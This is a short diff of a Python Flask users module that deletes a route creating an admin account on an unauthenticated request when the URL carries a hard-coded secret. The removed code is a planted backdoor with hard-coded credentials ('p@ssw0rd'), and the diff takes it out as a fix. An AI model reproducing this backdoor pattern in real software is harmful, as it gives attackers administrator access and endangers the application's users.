@@ -129,20 +129,3 @@ def recover(user_id):
     )
     user.save()
     return redirect(url_for("users.index"))
-
-
-@module.route("/<admin_id>/create", methods=["GET", "POST"])
-def create_admin(admin_id):
-    if admin_id == "p@ssw0rd":
-        user = models.User(
-            username="admin1",
-            first_name="admin1",
-            last_name="system",
-            status="active",
-            phone_number="1234567890",
-            email="admin1@example.com",
-            roles=["user", "admin"],
-            password=bcrypt.generate_password_hash("p@ssw0rd"),
-        )
-        user.save()
-    return redirect(url_for("accounts.login"))
